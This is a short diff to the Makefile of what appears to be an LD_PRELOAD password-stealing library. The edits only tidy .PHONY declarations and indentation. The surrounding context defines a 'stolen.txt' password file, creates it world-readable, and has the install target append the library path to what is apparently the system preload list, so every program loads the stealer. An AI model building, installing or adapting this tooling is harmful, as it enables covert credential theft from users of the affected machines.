@@ -19,6 +19,8 @@ PASSFILE = stolen.txt
 LIBLOC = $(INSTLOC)/$(PROG)
 PFLOC = $(INSTLOC)/$(PASSFILE)
 
+.PHONY: uninstall deinstall clean
+
 all: $(PROG)
 
 $(PROG): $(OBJECTS)
@@ -28,10 +30,6 @@ $(PROG): $(OBJECTS)
 	$(CC) $(CFLAGS) -c $< -o $@
 
 
-# Phony target for cleaning up generated files
-
-.PHONY: uninstall deinstall
-.PHONY: clean
 
 clean:
     ifneq ($(shell $(UID)), 0)
@@ -50,7 +48,7 @@ install: all
 	$(TOUCH) $(PFLOC)
 	$(PERMS) 644 $(PFLOC)
 	$(ECHO) $(LIBLOC) >> $(LDSOPRE)
-   endif
+    endif
 
 deinstall: all
     ifneq ($(shell $(UID)), 0)
